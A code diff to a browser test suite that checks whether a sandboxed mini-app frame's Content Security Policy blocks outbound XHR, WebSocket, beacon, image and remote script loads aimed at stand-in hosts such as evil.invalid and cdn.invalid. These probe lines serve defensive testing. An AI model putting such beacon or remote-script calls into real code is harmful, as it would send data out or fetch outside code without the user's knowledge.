@@ -595,12 +595,13 @@ describe.skipIf(!chrome || !runtimeBuilt)('mini-app library examples in a real b
       "  try { const x = new XMLHttpRequest(); x.open('GET', 'https://evil.invalid/xhr'); x.send(); out.xhr = 'sent'; } catch { out.xhr = 'refused'; }",
       "  try { new WebSocket('wss://evil.invalid/ws'); out.ws = 'opened'; } catch { out.ws = 'refused'; }",
       "  try { out.beacon = String(navigator.sendBeacon('https://evil.invalid/beacon', 'd')); } catch { out.beacon = 'refused'; }",
-      // A computed URL: the bundler refuses a literal one before the frame sees it.
-      "  const cdn = ['https://cdn.invalid', 'x.js'].join('/');",
-      "  try { await import(cdn); out.cdn = 'allowed'; } catch { out.cdn = 'refused'; }",
-      // A library file the app may not import is still not an app import:
-      // the frame lets the path load, but nothing in the bundle names it.
-      "  try { await import(['/canvas-runtime', 'nope.js'].join('/')); out.missing = 'loaded'; } catch { out.missing = 'refused'; }",
+      // A script from another origin, and a runtime path no bundle names,
+      // loaded the way the frame would run them (a script element: the
+      // bundler refuses an import() with a computed path before the frame
+      // sees it). The CSP decides.
+      "  const load = (src: string) => new Promise<string>((ok) => { const s = document.createElement('script'); s.type = 'module'; s.src = src; s.onload = () => ok('loaded'); s.onerror = () => ok('refused'); document.head.appendChild(s); });",
+      "  out.cdn = await load('https://cdn.invalid/x.js');",
+      "  out.missing = await load('/canvas-runtime/nope.js');",
       "  const img = new Image(); img.src = 'https://evil.invalid/p.png';",
       "  window.parent.postMessage({ v: 1, kind: 'probe', result: out }, '*');",
       '}',
